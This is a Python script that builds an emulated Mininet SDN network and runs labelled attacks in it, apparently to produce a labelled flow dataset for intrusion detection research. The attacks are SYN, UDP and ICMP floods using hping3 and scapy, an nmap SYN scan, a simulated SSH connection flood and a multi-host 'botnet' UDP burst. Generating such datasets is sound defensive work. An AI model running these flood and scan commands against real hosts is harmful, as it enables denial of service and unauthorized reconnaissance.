#!/usr/bin/env python3
"""
attack_orchestrator.py
 - Builds Mininet topology (h1..h6, s1..s3) and connects to remote Ryu controller at 127.0.0.1:6653
 - Starts benign servers and clients
 - Runs attack scenarios sequentially or concurrently (configurable)
 - Writes /tmp/current_label to label flows while attack is running
 - Copies /tmp/insdn_features.csv -> ./collected_<ts>.csv at end
"""
import os, time, subprocess
from mininet.net import Mininet
from mininet.node import RemoteController, OVSSwitch
from mininet.link import TCLink
from mininet.log import setLogLevel, info

LABEL_FILE = '/tmp/current_label'
CSV_IN = '/tmp/insdn_features.csv'

def write_label(v):
    with open(LABEL_FILE,'w') as f:
        f.write(str(v))

def clear_label():
    write_label(0)

def build_net(controller_ip='127.0.0.1', controller_port=6653):
    net = Mininet(controller=None, switch=OVSSwitch, link=TCLink, autoSetMacs=True)
    c0 = RemoteController('c0', ip=controller_ip, port=controller_port)
    net.addController(c0)
    s1 = net.addSwitch('s1', protocols='OpenFlow13')
    s2 = net.addSwitch('s2', protocols='OpenFlow13')
    s3 = net.addSwitch('s3', protocols='OpenFlow13')
    hosts = [net.addHost(f'h{i}', ip=f'10.0.0.{i}/24') for i in range(1,7)]
    # attach hosts to switches
    net.addLink(hosts[0], s1); net.addLink(hosts[1], s1)
    net.addLink(hosts[2], s2); net.addLink(hosts[3], s2)
    net.addLink(hosts[4], s3); net.addLink(hosts[5], s3)
    # inter-switch
    net.addLink(s1,s2); net.addLink(s2,s3)
    net.build(); c0.start(); s1.start([c0]); s2.start([c0]); s3.start([c0])
    # Start benign servers
    hosts[1].cmd('python3 -m http.server 80 >/tmp/h2_http.log 2>&1 &')   # h2 HTTP
    hosts[2].cmd('nohup socat TCP-LISTEN:2222,reuseaddr,fork EXEC:/bin/cat >/tmp/h3_echo.log 2>&1 &')  # h3 echo
    hosts[3].cmd('python3 -m http.server 8080 >/tmp/h4_http.log 2>&1 &')  # h4 HTTP
    return net

def start_benign(net):
    h1 = net.get('h1'); h2 = net.get('h2'); h3 = net.get('h3'); h4 = net.get('h4'); h5 = net.get('h5'); h6 = net.get('h6')
    # HTTP clients
    h1.cmd('bash -c "for i in {1..200}; do curl -s http://10.0.0.2/ >/dev/null; sleep 0.2; done" &')
    # echo tester
    h3.cmd('bash -c "for i in {1..200}; do echo HELLO $i | nc -w 1 10.0.0.3 2222; sleep 0.1; done" &')
    # small file transfer
    h6.cmd('bash -c "for i in {1..100}; do curl -s http://10.0.0.4:8080/ >/dev/null; sleep 0.5; done" &')
    info("Benign background traffic started\n")

# ----- attacks -----
def syn_flood(attacker, target, dur=10):
    # requires hping3 installed
    attacker.cmd(f'timeout {dur} hping3 --flood -S -p 80 --rand-source {target} >/tmp/syn_flood.log 2>&1 &')

def udp_flood(attacker, target, dur=10):
    # simple scapy flood (requires scapy installed in system)
    script = f"from scapy.all import *\nfor i in range(2000): send(IP(dst='{target}')/UDP(dport=53)/Raw(b'X'*1200), verbose=False)\n"
    attacker.cmd(f'python3 - <<PY\n{script}\nPY\n &')

def icmp_flood(attacker, target, dur=10):
    attacker.cmd(f'timeout {dur} hping3 --flood --icmp {target} >/tmp/icmp_flood.log 2>&1 &')

def nmap_scan(attacker, target):
    attacker.cmd(f'nmap -sS -p 1-1024 {target} -oN /tmp/scan.txt &')

def ssh_bruteforce_sim(attacker, target, tries=300):
    attacker.cmd(f'bash -c "for i in $(seq 1 {tries}); do timeout 1 bash -c \\"</dev/tcp/{target}/2222\\" 2>/dev/null || true; sleep 0.05; done" &')

def botnet_sim(attacker_list, target, dur=15):
    # simple coordinated UDP bursts from multiple attackers
    for h in attacker_list:
        h.cmd(f'python3 - <<PY\nfrom scapy.all import *\nfor i in range(1000): send(IP(dst="{target}")/UDP(dport=80)/Raw(b"B"*200), verbose=False)\nPY\n &')

def run_scenario(net):
    # pick attackers
    h1=net.get('h1'); h3=net.get('h3'); h4=net.get('h4'); h5=net.get('h5'); h6=net.get('h6')
    target='10.0.0.2' # h2
    # SYN flood label=1
    write_label(1); syn_flood(h1, target, dur=12); time.sleep(14); clear_label()
    # UDP flood label=2
    write_label(2); udp_flood(h3, target, dur=12); time.sleep(14); clear_label()
    # ICMP flood label=3
    write_label(3); icmp_flood(h4, target, dur=12); time.sleep(14); clear_label()
    # nmap scan label=4
    write_label(4); nmap_scan(h5, target); time.sleep(12); clear_label()
    # ssh brute label=5
    write_label(5); ssh_bruteforce_sim(h6, '10.0.0.3', tries=400); time.sleep(14); clear_label()
    # botnet sim label=6 (h1,h3,h4 simultaneously)
    write_label(6); botnet_sim([h1,h3,h4], target, dur=12); time.sleep(14); clear_label()

def collect_csv():
    time.sleep(3)
    if os.path.exists(CSV_IN):
        dst=f"./collected_{int(time.time())}.csv"
        subprocess.run(['cp', CSV_IN, dst])
        info("CSV copied -> %s\n" % dst)
    else:
        info("No CSV found at %s\n" % CSV_IN)

def main():
    setLogLevel('info')
    clear_label()
    net = build_net()
    try:
        start_benign(net)
        time.sleep(6)
        run_scenario(net)
        time.sleep(4)
        collect_csv()
        info("Scenario done; entering CLI (Ctrl-D to quit)\n")
        from mininet.cli import CLI; CLI(net)
    finally:
        clear_label()
        net.stop()

if __name__ == '__main__':
    main()
